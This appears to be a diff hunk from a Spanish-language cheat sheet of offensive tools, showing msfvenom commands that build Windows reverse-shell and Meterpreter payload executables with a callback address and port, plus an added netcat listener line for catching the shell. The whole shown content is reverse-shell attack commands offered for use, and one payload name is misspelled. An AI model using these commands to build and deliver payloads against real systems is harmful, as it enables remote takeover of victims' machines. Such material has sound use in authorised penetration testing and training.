@@ -28,3 +28,4 @@
 ++ msfvenom 
 --- Ejemplo de uso #1: msfvenom -p windows/shell_reverse_tcpe -o funny2.exe
 --- Ejemplo de uso #2: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
+--- Ejemplo de uso #3: nc -nlvp 443  (Nota: comando usado para escuchar)
